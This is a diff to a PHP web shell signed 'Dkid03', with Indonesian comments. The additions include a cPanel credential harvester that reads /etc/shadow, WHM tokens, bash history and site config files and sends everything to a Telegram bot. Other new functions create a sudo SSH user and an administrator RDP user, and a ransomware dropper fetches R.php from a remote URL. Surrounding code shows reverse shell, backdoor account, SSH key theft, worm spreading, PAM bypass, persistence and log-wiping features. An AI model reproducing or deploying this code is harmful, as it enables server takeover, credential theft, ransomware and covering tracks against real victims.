@@ -2,10 +2,8 @@
 //Maker: Dkid03
 //Don't change the author 
 
-// ===== DETEKSI NAMA FILE OTOMATIS =====
 $CURRENT_SHELL = basename(__FILE__);
 
-// ===== RESTORE FUNCTION MENGIKUTI NAMA =====
 function auto_restore_by_name() {
     global $CURRENT_SHELL;
     
@@ -910,198 +908,260 @@ function worm_infect_all_domains($currentFile) {
     return ['infected' => $infected, 'links' => $domainLinks, 'errors' => $errors, 'total_domains' => count($domain_list)];
 }
 
-// ===== CPANEL MODULE =====
-function is_cpanel_installed() {
-    if (file_exists('/usr/local/cpanel/version')) return true;
-    if (file_exists('/usr/local/cpanel/cpanel')) return true;
-    if (file_exists('/usr/local/cpanel')) return true;
-    $ports = [2082, 2083, 2086, 2087, 2095, 2096];
-    foreach ($ports as $port) {
-        $sock = @fsockopen('127.0.0.1', $port, $errno, $errstr, 1);
-        if ($sock) { fclose($sock); return true; }
-    }
-    return false;
-}
+// ==================== CPANEL HARVEST & AUTO SSH ====================
 
-function get_whm_token() {
+// ==================== CPANEL HARVEST (FOKUS KREDENSIAL) ====================
+function cpanel_harvest() {
+    global $botToken, $telegramUserId;
+    $credentials = [];
+    $scanned = [];
+
+    // ===== 1. SCAN /etc/passwd (USERNAME) =====
+    if (file_exists('/etc/passwd') && is_readable('/etc/passwd')) {
+        $passwd = file('/etc/passwd');
+        $users = [];
+        foreach ($passwd as $line) {
+            $parts = explode(':', $line);
+            if (count($parts) >= 3 && $parts[2] >= 1000 && $parts[2] < 65534) {
+                $users[] = $parts[0];
+            }
+        }
+        if (!empty($users)) {
+            $credentials[] = "👤 Users: " . implode(', ', array_slice($users, 0, 10));
+            $scanned[] = "📄 /etc/passwd scanned";
+        }
+    }
+
+    // ===== 2. SCAN /etc/shadow (HASH PASSWORD) =====
+    if (file_exists('/etc/shadow') && is_readable('/etc/shadow')) {
+        $shadow = file('/etc/shadow');
+        $hashes = [];
+        foreach ($shadow as $line) {
+            $parts = explode(':', $line);
+            if (count($parts) >= 2 && !empty($parts[1]) && $parts[1] != '*' && $parts[1] != '!') {
+                $hashes[] = $parts[0] . ':' . substr($parts[1], 0, 20) . '...';
+            }
+        }
+        if (!empty($hashes)) {
+            $credentials[] = "🔑 Password Hashes: " . implode(', ', array_slice($hashes, 0, 5));
+            $scanned[] = "📄 /etc/shadow scanned";
+        }
+    }
+
+    // ===== 3. SCAN TOKEN WHM & ACCESSHASH =====
     $token_locations = [
-        '/root/.accesshash', '/root/.cpanel/whm_token',
-        '/home/*/.cpanel/whm_token', '/etc/cpanel/whm_token',
-        '/usr/local/cpanel/whm_token', '/var/cpanel/whm_token',
-        '/root/.cpanel/token'
+        '/root/.accesshash',
+        '/root/.cpanel/whm_token',
+        '/etc/cpanel/whm_token',
+        '/var/cpanel/whm_token',
+        '/usr/local/cpanel/whm_token',
+        '/home/*/.cpanel/whm_token',
+        '/home/*/.accesshash'
     ];
     foreach ($token_locations as $pattern) {
-        $files = @glob($pattern);
-        if ($files !== false) {
-            foreach ($files as $file) {
-                if (is_file($file) && is_readable($file)) {
-                    $content = @file_get_contents($file);
-                    if ($content) {
-                        $content = trim($content);
-                        if (preg_match('/[a-f0-9]{64}/i', $content, $match)) return $match[0];
-                        if (preg_match('/[a-f0-9]{32}/i', $content, $match)) return $match[0];
-                        if (strlen($content) > 20) return $content;
-                    }
+        $files = glob($pattern);
+        foreach ($files as $file) {
+            if (is_file($file) && is_readable($file)) {
+                $content = trim(file_get_contents($file));
+                if (!empty($content) && strlen($content) > 10) {
+                    $credentials[] = "🔑 Token WHM: `$content` (dari $file)";
+                    $scanned[] = "✅ Token ditemukan di $file";
                 }
             }
         }
     }
-    $env_token = getenv('WHM_TOKEN');
-    if ($env_token) return $env_token;
-    return false;
-}
 
-function cpanel_api_request($endpoint, $params = [], $method = 'GET') {
-    $token = get_whm_token();
-    if (!$token) return ['error' => 'WHM token tidak ditemukan'];
-    if (!function_exists('curl_init')) return ['error' => 'CURL tidak tersedia'];
-    $url = "https://127.0.0.1:2087/json-api/" . $endpoint . "?" . http_build_query($params);
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
-    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Authorization: whm ' . $token]);
-    curl_setopt($ch, CURLOPT_USERAGENT, 'DKD03-API/1.0');
-    if ($method === 'POST') {
-        curl_setopt($ch, CURLOPT_POST, true);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
+    // ===== 4. SCAN BASH HISTORY (TOKEN/PASSWORD) =====
+    $history_files = ['/root/.bash_history', '/home/*/.bash_history'];
+    foreach ($history_files as $pattern) {
+        $files = glob($pattern);
+        foreach ($files as $file) {
+            if (is_file($file) && is_readable($file)) {
+                $content = file_get_contents($file);
+                preg_match_all('/(whmapi1|uapi|curl.*2087|whm.*token|whm.*password|passwd|useradd|mysql.*-p|ssh.*-p)\s+([^\s]+)/i', $content, $matches);
+                if (!empty($matches[2])) {
+                    foreach ($matches[2] as $cmd) {
+                        if (strlen($cmd) > 5) {
+                            $credentials[] = "📜 History: `$cmd` (dari $file)";
+                        }
+                    }
+                }
+                $scanned[] = "📜 History scanned: $file";
+            }
+        }
     }
-    $response = curl_exec($ch);
-    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-    $curlError = curl_error($ch);
-    curl_close($ch);
-    if ($response === false) return ['error' => 'Gagal terhubung: ' . $curlError];
-    if ($httpCode !== 200) return ['error' => 'HTTP Error: ' . $httpCode];
-    $data = json_decode($response, true);
-    if (!isset($data['data'])) return ['error' => 'Respon tidak valid'];
-    return $data['data'];
-}
 
-function cpanel_list_accounts() {
-    $data = cpanel_api_request('listaccts');
-    if (isset($data['error'])) return "❌ " . $data['error'];
-    if (!isset($data['acct']) || empty($data['acct'])) return "❌ Tidak ada akun ditemukan.";
-    $accounts = [];
-    foreach ($data['acct'] as $acct) {
-        $accounts[] = "- " . $acct['user'] . " (domain: " . $acct['domain'] . ", plan: " . $acct['plan'] . ")";
+    // ===== 5. SCAN FILE KONFIGURASI CPANEL (PASSWORD) =====
+    $config_files = [
+        '/etc/cpanel/cpanel.config',
+        '/var/cpanel/cpanel.config',
+        '/usr/local/cpanel/etc/cpanel.config',
+        '/home/*/.cpanel/cpanel.config'
+    ];
+    foreach ($config_files as $pattern) {
+        $files = glob($pattern);
+        foreach ($files as $file) {
+            if (is_file($file) && is_readable($file)) {
+                $content = file_get_contents($file);
+                preg_match_all('/(password|pass|pwd|key|secret|token)\s*=\s*([^\s]+)/i', $content, $matches);
+                if (!empty($matches[2])) {
+                    foreach ($matches[2] as $cred) {
+                        if (strlen($cred) > 3) {
+                            $credentials[] = "📄 Config: `$cred` (dari $file)";
+                        }
+                    }
+                }
+                $scanned[] = "📄 Config scanned: $file";
+            }
+        }
     }
-    return "📋 *cPanel Accounts*\n\n" . implode("\n", $accounts);
-}
 
-function cpanel_create_account($username, $domain, $password, $plan = 'default') {
-    $params = ['username' => $username, 'domain' => $domain, 'password' => $password, 'plan' => $plan, 'contactemail' => $username . '@' . $domain];
-    $result = cpanel_api_request('createacct', $params, 'POST');
-    if (isset($result['error'])) return "❌ " . $result['error'];
-    return "✅ Akun berhasil dibuat:\nUsername: $username\nDomain: $domain\nPassword: $password";
-}
-
-function cpanel_change_password($username, $newPassword) {
-    $params = ['user' => $username, 'pass' => $newPassword];
-    $result = cpanel_api_request('passwd', $params, 'POST');
-    if (isset($result['error'])) return "❌ " . $result['error'];
-    return "✅ Password berhasil diubah untuk $username";
-}
-
-function cpanel_backup_account($username) {
-    $params = ['user' => $username];
-    $result = cpanel_api_request('backup', $params, 'POST');
-    if (isset($result['error'])) return "❌ " . $result['error'];
-    return "✅ Backup akun $username sedang diproses.";
-}
-
-function cpanel_delete_account($username, $keepfiles = '0') {
-    $params = ['user' => $username, 'keepfiles' => $keepfiles];
-    $result = cpanel_api_request('removeacct', $params, 'POST');
-    if (isset($result['error'])) return "❌ " . $result['error'];
-    return "✅ Akun $username berhasil dihapus.";
-}
-
-function cpanel_handler($action, $username = '', $extra = '') {
-    if (!is_cpanel_installed()) return "❌ cPanel/WHM tidak terdeteksi di server ini.";
-    $token = get_whm_token();
-    if (!$token) {
-        return "❌ WHM token tidak ditemukan.\n\n"
-             . "Cara mendapatkan token:\n"
-             . "1. Login ke WHM sebagai root\n"
-             . "2. Buka: Home > Development > Manage API Tokens\n"
-             . "3. Klik 'Generate Token'\n"
-             . "4. Beri nama dan pilih 'All Functions'\n"
-             . "5. Klik 'Generate'\n"
-             . "6. Copy token yang muncul\n"
-             . "7. Simpan di /root/.cpanel/whm_token";
-    }
-    switch ($action) {
-        case 'list': return cpanel_list_accounts();
-        case 'create':
-            if (empty($username) || empty($extra)) return "❌ Format: create [username] [domain] [password] [plan]\nContoh: create testuser test.com Pass123@ default";
-            $parts = explode(' ', $extra);
-            $domain = $parts[0] ?? '';
-            $password = $parts[1] ?? 'password123';
-            $plan = $parts[2] ?? 'default';
-            return cpanel_create_account($username, $domain, $password, $plan);
-        case 'passwd':
-            if (empty($username) || empty($extra)) return "❌ Format: passwd [username] [passwordbaru]";
-            return cpanel_change_password($username, $extra);
-        case 'backup':
-            if (empty($username)) return "❌ Format: backup [username]";
-            return cpanel_backup_account($username);
-        case 'delete':
-            if (empty($username)) return "❌ Format: delete [username] [keepfiles?]";
-            $keep = ($extra == 'keep') ? '1' : '0';
-            return cpanel_delete_account($username, $keep);
-        default: return "❌ Aksi tidak dikenali.\nGunakan: list, create, passwd, backup, delete";
-    }
-}
-
-function cpanel_harvest() {
-    global $botToken, $telegramUserId;
-    $found = [];
-    $roots = get_all_document_roots_cached();
-    $config_files = ['.env', 'wp-config.php', 'config.php', 'database.php', 'db.php'];
-    foreach ($roots as $root) {
-        if (!is_dir($root) || !is_readable($root)) continue;
-        foreach ($config_files as $file) {
-            $path = $root . '/' . $file;
-            if (file_exists($path) && is_readable($path)) {
-                $content = file_get_contents($path);
-                $patterns = [
-                    '/(DB_PASSWORD|DB_PASS|PASSWORD|SECRET_KEY|API_KEY|AUTH_KEY|APP_KEY)\s*=\s*[\'"]?([^\'"]+)[\'"]?/i',
-                    '/define\(\s*[\'"]?(DB_PASSWORD|DB_PASS)[\'"]?\s*,\s*[\'"]([^\'"]+)[\'"]\s*\)/i'
-                ];
-                foreach ($patterns as $pattern) {
-                    preg_match_all($pattern, $content, $matches);
-                    if (!empty($matches[1]) && !empty($matches[2])) {
-                        foreach ($matches[1] as $i => $key) {
-                            $found[] = "📁 " . basename($path) . " - " . $key . ": " . trim($matches[2][$i]);
+    // ===== 6. SCAN SESSION CPANEL (USERNAME) =====
+    $session_dirs = ['/var/cpanel/sessions', '/tmp/cpanel_sessions', '/usr/local/cpanel/sessions'];
+    foreach ($session_dirs as $dir) {
+        if (is_dir($dir) && is_readable($dir)) {
+            $files = scandir($dir);
+            foreach ($files as $f) {
+                if ($f != '.' && $f != '..' && strlen($f) > 10) {
+                    $session_file = "$dir/$f";
+                    if (is_file($session_file) && is_readable($session_file)) {
+                        $content = file_get_contents($session_file);
+                        if (preg_match('/username=([^\s&]+)/', $content, $m)) {
+                            $credentials[] = "👤 Session User: " . $m[1] . " (dari $session_file)";
                         }
                     }
                 }
             }
+            $scanned[] = "🍪 Sessions scanned: $dir";
         }
     }
-    if (function_exists('shell_exec')) {
-        $home_dirs = @glob('/home/*');
-        if ($home_dirs !== false) {
-            foreach ($home_dirs as $home) {
-                $accesshash = $home . '/.accesshash';
-                if (file_exists($accesshash) && is_readable($accesshash)) {
-                    $hash = file_get_contents($accesshash);
-                    $found[] = "📁 " . basename($home) . " - AccessHash: " . trim($hash);
+
+    // ===== 7. SCAN HOME DIRECTORIES FOR .env / CONFIG (USER/PASS) =====
+    $home_dirs = glob('/home/*', GLOB_ONLYDIR);
+    foreach ($home_dirs as $home) {
+        $env = $home . '/.env';
+        $wp_config = $home . '/public_html/wp-config.php';
+        $config = $home . '/public_html/config.php';
+        $db_config = $home . '/public_html/database.php';
+        
+        foreach ([$env, $wp_config, $config, $db_config] as $file) {
+            if (file_exists($file) && is_readable($file)) {
+                $content = file_get_contents($file);
+                preg_match_all('/(DB_USER|DB_PASSWORD|DB_PASS|PASSWORD|SECRET_KEY|API_KEY|AUTH_KEY)\s*=\s*[\'"]?([^\'"]+)[\'"]?/i', $content, $matches);
+                if (!empty($matches[2])) {
+                    foreach ($matches[1] as $i => $key) {
+                        $val = trim($matches[2][$i]);
+                        if (strlen($val) > 3) {
+                            $credentials[] = "📁 $key: `$val` (dari " . basename($file) . ")";
+                        }
+                    }
                 }
+                $scanned[] = "📁 Config scanned: $file";
             }
         }
     }
-    if (empty($found)) { 
-        sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ditemukan kredensial."); 
-        return []; 
+
+    // ===== KIRIM HASIL =====
+    $msg = "🔑 *CPANEL HARVEST - CREDENTIALS*\n\n";
+    if (!empty($credentials)) {
+        $msg .= "📋 *Kredensial Ditemukan:*\n" . implode("\n", array_slice($credentials, 0, 30));
+        if (count($credentials) > 30) {
+            $msg .= "\n... dan " . (count($credentials) - 30) . " lainnya";
+        }
+    } else {
+        $msg .= "❌ Tidak ada kredensial ditemukan.\n";
     }
-    $msg = "🔑 *Credential Harvest Results*\n\n" . implode("\n", $found);
+    $msg .= "\n📊 *Scan Details:*\n" . implode("\n", $scanned);
+
     sendTelegramMessage($botToken, $telegramUserId, $msg);
-    return $found;
+    return $msg;
 }
 
+// ===== 2. AUTO CREATE SSH USER =====
+function auto_create_ssh($username = '', $password = '') {
+    global $botToken, $telegramUserId;
+
+    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
+        $msg = "❌ Fitur ini hanya untuk server Linux! OS: " . PHP_OS;
+        sendTelegramMessage($botToken, $telegramUserId, $msg);
+        return $msg;
+    }
+    if (!function_exists('shell_exec')) {
+        $msg = "❌ shell_exec tidak tersedia!";
+        sendTelegramMessage($botToken, $telegramUserId, $msg);
+        return $msg;
+    }
+
+    // Generate username jika kosong
+    if (empty($username)) {
+        $username = 'ssh_' . bin2hex(random_bytes(4));
+    }
+    // Generate password jika kosong
+    if (empty($password)) {
+        $password = bin2hex(random_bytes(6)) . '@' . rand(100, 999);
+    }
+
+    $u = escapeshellarg($username);
+    $p = escapeshellarg($password);
+
+    // Cek apakah user sudah ada
+    $check = shell_exec("id $u 2>&1");
+    if (strpos($check, 'uid') !== false) {
+        $msg = "⚠️ User '$username' sudah ada!";
+        sendTelegramMessage($botToken, $telegramUserId, $msg);
+        return $msg;
+    }
+
+    // Buat user
+    $cmd = "useradd -m -s /bin/bash $u 2>&1";
+    $out = shell_exec($cmd);
+    if (strpos($out, 'already exists') !== false) {
+        $msg = "⚠️ User '$username' sudah ada!";
+        sendTelegramMessage($botToken, $telegramUserId, $msg);
+        return $msg;
+    }
+
+    // Set password
+    shell_exec("echo \"$u:$p\" | chpasswd 2>&1");
+
+    // Tambahkan ke sudo/wheel
+    $sudo = shell_exec("which sudo 2>/dev/null");
+    if (!empty($sudo)) {
+        shell_exec("usermod -aG sudo $u 2>&1");
+    } else {
+        shell_exec("usermod -aG wheel $u 2>&1");
+    }
+
+    // Ambil UID
+    $uid = shell_exec("id -u $u 2>&1");
+
+    $msg = "✅ *SSH USER CREATED SUCCESSFULLY!*\n\n"
+         . "👤 Username: `$username`\n"
+         . "🔐 Password: `$password`\n"
+         . "📂 Home: /home/$username\n"
+         . "🆔 UID: " . trim($uid) . "\n"
+         . "🖥️ Host: " . gethostname() . "\n"
+         . "🌐 IP: " . (shell_exec('curl -s ifconfig.me 2>&1') ?: $_SERVER['SERVER_ADDR'] ?? 'unknown');
+
+    sendTelegramMessage($botToken, $telegramUserId, $msg);
+    return $msg;
+}
+
+// ===== HANDLER CPANEL HARVEST =====
+if (isset($_GET['cpanel_harvest']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+    echo cpanel_harvest();
+    exit;
+}
+
+// ===== HANDLER AUTO CREATE SSH =====
+if (isset($_GET['create_ssh']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+    $user = $_GET['user'] ?? '';
+    $pass = $_GET['pass'] ?? '';
+    echo auto_create_ssh($user, $pass);
+    exit;
+}
+
+// ==================== BACKDOOR USER ====================
 function create_backdoor_user($username, $password) {
     global $botToken, $telegramUserId;
     if (!function_exists('shell_exec')) return "❌ shell_exec tidak tersedia";
@@ -1120,6 +1180,7 @@ function create_backdoor_user($username, $password) {
     return $msg;
 }
 
+// ==================== REVERSE SHELL ====================
 function start_reverse_shell($ip, $port) {
     global $botToken, $telegramUserId;
     if (!function_exists('shell_exec')) return "❌ shell_exec tidak tersedia";
@@ -1151,6 +1212,7 @@ function status_reverse_shell() {
     return $msg;
 }
 
+// ==================== SSH KEYS GRABBER ====================
 function grab_ssh_keys() {
     global $botToken, $telegramUserId;
     $keys = [];
@@ -1179,6 +1241,7 @@ function grab_ssh_keys() {
     return $keys;
 }
 
+// ==================== WP SCAN ====================
 function scan_wordpress_laravel() {
     global $botToken, $telegramUserId;
     $found = [];
@@ -1234,22 +1297,68 @@ function scan_wordpress_laravel() {
     return $found;
 }
 
+// ==================== RANSOMWARE CREATOR ====================
 function create_ransomware() {
     global $botToken, $telegramUserId;
-    $code = '<?php
-echo "💀 RANSOMWARE DKD03\n";
-echo "File terenkripsi: " . $_SERVER["DOCUMENT_ROOT"] . "\n";
-echo "Password: Dkid@123\n";
-?>';
-    $file = __DIR__ . '/R.php';
-    @file_put_contents($file, $code);
-    @chmod($file, 0644);
-    $url = "http://" . ($_SERVER['HTTP_HOST'] ?? 'localhost') . "/R.php";
-    $msg = "💀 Ransomware created:\n📁 $file\n🔗 $url";
+    $url = 'https://raw.githubusercontent.com/Iqyans/IqyanCodes/refs/heads/main/R.php';
+    
+    // --- 1. Tentukan direktori target (hanya __DIR__) ---
+    $targetDir = __DIR__;
+    $targetFile = $targetDir . '/R.php';
+    
+    // --- 2. Unduh dan simpan R.php ---
+    $code = @file_get_contents($url);
+    if ($code === false && function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
+        $code = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+        if ($httpCode !== 200) $code = false;
+    }
+    if ($code === false || empty($code)) {
+        sendTelegramMessage($botToken, $telegramUserId, " Gagal mengunduh ransomware.");
+        return false;
+    }
+    
+    if (@file_put_contents($targetFile, $code) === false) {
+        sendTelegramMessage($botToken, $telegramUserId, " Gagal menyimpan R.php.");
+        return false;
+    }
+    
+    // --- 3. TIDAK ADA LOCK OTOMATIS (file dan direktori dibiarkan normal) ---
+    @chmod($targetFile, 0644);
+    
+    // --- 4. Buat URL yang akurat ---
+    $domain = $_SERVER['HTTP_HOST'] ?? '';
+    if (empty($domain) || $domain == 'localhost') {
+        $domains = get_all_domains_by_ip();
+        $domain = $domains[0] ?? $_SERVER['SERVER_NAME'] ?? 'unknown';
+    }
+    
+    $docRoot = $_SERVER['DOCUMENT_ROOT'] ?? '';
+    $relativePath = '';
+    if ($docRoot && strpos($targetDir, $docRoot) === 0) {
+        $relativePath = ltrim(substr($targetDir, strlen($docRoot)), '/');
+        if ($relativePath) $relativePath .= '/';
+    } else {
+        $relativePath = basename($targetDir) . '/';
+    }
+    $urlPath = $relativePath . 'R.php';
+    $fullUrl = (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') . $domain . '/' . ltrim($urlPath, '/');
+    
+    // --- 5. Kirim notifikasi ---
+    $msg = " Ransomware berhasil dibuat.\n"
+         . " Lokasi: <a href='$fullUrl'>$fullUrl</a>\n"
+         . " Path fisik: $targetFile\n";
     sendTelegramMessage($botToken, $telegramUserId, $msg);
     return true;
 }
 
+// ==================== FIND SENSITIVE FILES ====================
 function find_sensitive_files() {
     global $botToken, $telegramUserId;
     $found = [];
@@ -1282,6 +1391,7 @@ function find_sensitive_files() {
     return $found;
 }
 
+// ==================== DUMP DATABASE ====================
 function dump_databases() {
     global $botToken, $telegramUserId;
     $results = [];
@@ -1354,6 +1464,7 @@ function dump_databases() {
     return array_merge($found_configs, $results);
 }
 
+// ==================== ANTI FORENSIC ====================
 function anti_forensic_ultimate() {
     global $botToken, $telegramUserId;
     $results = [];
@@ -1381,6 +1492,7 @@ function anti_forensic_ultimate() {
     return ['success' => true, 'msg' => implode("\n", $results)];
 }
 
+// ==================== BYPASS SUHOSIN ====================
 function bypass_suhosin() {
     global $botToken, $telegramUserId;
     $disabled = ini_get('disable_functions');
@@ -1401,6 +1513,7 @@ function bypass_suhosin() {
     return ['success' => true, 'msg' => $msg];
 }
 
+// ==================== CREATE FTP ACCOUNT ====================
 function create_ftp_account($username, $password, $home = '') {
     global $botToken, $telegramUserId;
     $home = $home ?: '/home/' . $username;
@@ -1426,6 +1539,7 @@ function create_ftp_account($username, $password, $home = '') {
     return ['success' => true, 'msg' => "✅ FTP account $username created"];
 }
 
+// ==================== CREATE MAIL ACCOUNT ====================
 function create_mail_account($email, $password, $domain = '') {
     global $botToken, $telegramUserId;
     $domain = $domain ?: $_SERVER['HTTP_HOST'];
@@ -1455,6 +1569,7 @@ function create_mail_account($email, $password, $domain = '') {
     return ['success' => true, 'msg' => "✅ Mail account $email created"];
 }
 
+// ==================== DEEP PERSISTENCE ====================
 function install_deep_persistence() {
     global $botToken, $telegramUserId;
     $results = [];
@@ -1511,6 +1626,7 @@ function remove_deep_persistence() {
     return ['success' => true, 'msg' => $msg];
 }
 
+// ==================== PAM BYPASS ====================
 function pam_bypass_install($password = 'BackdoorPass123') {
     global $botToken, $telegramUserId;
     if (!isRoot()) return ['success' => false, 'msg' => "❌ Harus root"];
@@ -1556,6 +1672,7 @@ function pam_bypass_remove() {
     return ['success' => true, 'msg' => $msg];
 }
 
+// ==================== USER PERSISTENCE ====================
 function user_persistence_install() {
     global $botToken, $telegramUserId;
     $results = [];
@@ -1605,6 +1722,7 @@ function user_persistence_remove() {
     return ['success' => true, 'msg' => $msg];
 }
 
+// ==================== LIST SPREAD FILES ====================
 function list_spread_files() {
     global $botToken, $telegramUserId;
     $found = [];
@@ -1623,6 +1741,7 @@ function list_spread_files() {
     return $found;
 }
 
+// ==================== CLEAR LOGS ADVANCED ====================
 function clean_logs_advanced() {
     global $botToken, $telegramUserId;
     $logs = [
@@ -1981,23 +2100,6 @@ if (isset($_GET['clean']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin
     exit;
 }
 
-// ===== CPANEL HANDLERS =====
-if (isset($_GET['cpanel']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $action = $_GET['action'] ?? 'list';
-    $username = $_GET['user'] ?? '';
-    $extra = $_GET['extra'] ?? '';
-    $result = cpanel_handler($action, $username, $extra);
-    sendTelegramMessage($botToken, $telegramUserId, "📋 *cPanel Result*\n\n" . $result);
-    echo $result;
-    exit;
-}
-
-if (isset($_GET['harvest']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    cpanel_harvest();
-    echo "🔑 Harvest executed. Check Telegram.";
-    exit;
-}
-
 // ===== BACKDOOR USER =====
 if (isset($_GET['backdooruser']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
     $user = $_GET['user'] ?? '';
@@ -2083,6 +2185,63 @@ if (isset($_GET['create_mail']) && isset($_SESSION['loggedin']) && $_SESSION['lo
     $domain = $_GET['domain'] ?? $_SERVER['HTTP_HOST'];
     $result = create_mail_account($email, $pass, $domain);
     echo $result['msg'];
+    exit;
+}
+
+// ===== CREATE RDP USER =====
+function create_rdp_user($username, $password) {
+    global $botToken, $telegramUserId;
+    $results = [];
+    
+    if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN') {
+        $msg = "❌ Server bukan Windows! OS: " . PHP_OS;
+        sendTelegramMessage($botToken, $telegramUserId, $msg);
+        return $msg;
+    }
+    if (!function_exists('shell_exec')) {
+        $msg = "❌ shell_exec tidak tersedia!";
+        sendTelegramMessage($botToken, $telegramUserId, $msg);
+        return $msg;
+    }
+    $check = shell_exec("net user " . escapeshellarg($username) . " 2>&1");
+    if (strpos($check, 'User name') !== false) {
+        $msg = "⚠️ User '$username' sudah ada!";
+        sendTelegramMessage($botToken, $telegramUserId, $msg);
+        return $msg;
+    }
+    
+    $u = escapeshellarg($username);
+    $p = escapeshellarg($password);
+    $cmd = "net user $u $p /add 2>&1";
+    $output = shell_exec($cmd);
+    $results[] = "📌 Add user: " . trim($output);
+    
+    if (strpos($output, 'completed successfully') !== false || strpos($output, 'berhasil') !== false) {
+        shell_exec("net localgroup Administrators $u /add 2>&1");
+        shell_exec("net localgroup \"Remote Desktop Users\" $u /add 2>&1");
+        shell_exec("net user $u /active:yes 2>&1");
+        $rdp_status = shell_exec("sc query TermService | findstr STATE 2>&1");
+        if (strpos($rdp_status, 'STOPPED') !== false) {
+            shell_exec("sc start TermService 2>&1");
+        }
+        $msg = "✅ *RDP USER CREATED SUCCESSFULLY!*\n\n"
+             . "👤 Username: `$username`\n"
+             . "🔐 Password: `$password`\n"
+             . "🖥️ Host: " . gethostname() . "\n"
+             . "🌐 IP: " . (shell_exec('curl -s ifconfig.me 2>&1') ?: $_SERVER['SERVER_ADDR'] ?? 'unknown');
+        sendTelegramMessage($botToken, $telegramUserId, $msg);
+        return $msg;
+    } else {
+        $msg = "❌ GAGAL BUAT USER! Cek password (min 8 karakter, kompleks) atau hak akses.";
+        sendTelegramMessage($botToken, $telegramUserId, $msg);
+        return $msg;
+    }
+}
+
+if (isset($_GET['create_rdp']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+    $user = $_GET['user'] ?? 'rdp_' . rand(1000,9999);
+    $pass = $_GET['pass'] ?? 'P@ssw0rd' . rand(1000,9999) . '!';
+    echo create_rdp_user($user, $pass);
     exit;
 }
 
@@ -2524,8 +2683,15 @@ if (isset($_SESSION['loggedin'])) {
                     <!-- ADVANCED -->
                     <div class="menu-section">
                         <div class="menu-title">🔧 Advanced</div>
-                        <div class="menu-item" onclick="runCpanel()"><i class="fas fa-server"></i> cPanel</div>
-                        <div class="menu-item" onclick="runHarvest()"><i class="fas fa-key"></i> Harvest</div>
+                        <div class="menu-item" onclick="runCpanelHarvest()" style="color:#ff8800;">
+                            <i class="fas fa-search"></i> cPanel Harvest
+                        </div>
+                        <div class="menu-item" onclick="runCreateSSH()" style="color:#00ccff;">
+                            <i class="fas fa-terminal"></i> Create SSH User
+                        </div>
+                        <div class="menu-item" onclick="runCreateRDP()" style="color:#00ccff;">
+                            <i class="fas fa-desktop"></i> Create RDP User
+                        </div>
                         <div class="menu-item" onclick="runBackdoorUser()"><i class="fas fa-user-plus"></i> Backdoor User</div>
                         <div class="menu-item" onclick="runReverseShell()"><i class="fas fa-terminal"></i> Reverse Shell</div>
                         <div class="menu-item" onclick="runSSHKeys()"><i class="fas fa-key"></i> SSH Keys</div>
@@ -2812,18 +2978,39 @@ if (isset($_SESSION['loggedin'])) {
                 }
             }
 
-            // ===== ADVANCED =====
-            function runCpanel() {
-                var action = prompt('cPanel: list, create [user domain pass], delete [user]');
-                if(action) {
-                    var p = action.split(' ');
-                    fetch('?cpanel=1&action='+encodeURIComponent(p[0])+'&user='+encodeURIComponent(p[1]||'')+'&extra='+encodeURIComponent(p.slice(2).join(' ')))
-                        .then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));
+            // ===== CPANEL HARVEST =====
+            function runCpanelHarvest() {
+                if(confirm('🔍 HARVEST CPANEL?\n\nAkan mencari token, password, session, dan kredensial cPanel.\nHasil dikirim ke Telegram.\n\nLANJUTKAN?')) {
+                    fetch('?cpanel_harvest=1')
+                        .then(r=>r.text())
+                        .then(d=>alert(d))
+                        .catch(()=>alert('Error'));
                 }
             }
+
+            // ===== AUTO CREATE SSH =====
+            function runCreateSSH() {
+                var user = prompt('Username SSH (kosong = auto-generate):', '');
+                var pass = prompt('Password SSH (kosong = auto-generate):', '');
+                fetch('?create_ssh=1&user='+encodeURIComponent(user)+'&pass='+encodeURIComponent(pass))
+                    .then(r=>r.text())
+                    .then(d=>alert(d))
+                    .catch(()=>alert('Error'));
+            }
             
-            function runHarvest(){ if(confirm('Harvest credentials?')){ fetch('?harvest=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error')); } }
+            // ===== CREATE RDP =====
+            function runCreateRDP() {
+                var user = prompt('Username RDP:', 'admin' + Math.floor(Math.random()*1000));
+                if (!user) return;
+                var pass = prompt('Password (min 8 karakter, kompleks):', 'P@ssw0rd123!');
+                if (!pass) return;
+                fetch('?create_rdp=1&user='+encodeURIComponent(user)+'&pass='+encodeURIComponent(pass))
+                    .then(r=>r.text())
+                    .then(d=>alert(d))
+                    .catch(()=>alert('Error'));
+            }
             
+            // ===== BACKDOOR USER =====
             function runBackdoorUser(){ 
                 var u=prompt('Username:'); 
                 if(u){ 
@@ -2832,6 +3019,7 @@ if (isset($_SESSION['loggedin'])) {
                 } 
             }
             
+            // ===== REVERSE SHELL =====
             function runReverseShell(){ 
                 var a=prompt('Reverse shell: start [ip] [port], stop [port], status'); 
                 if(a){ 
@@ -2840,16 +3028,22 @@ if (isset($_SESSION['loggedin'])) {
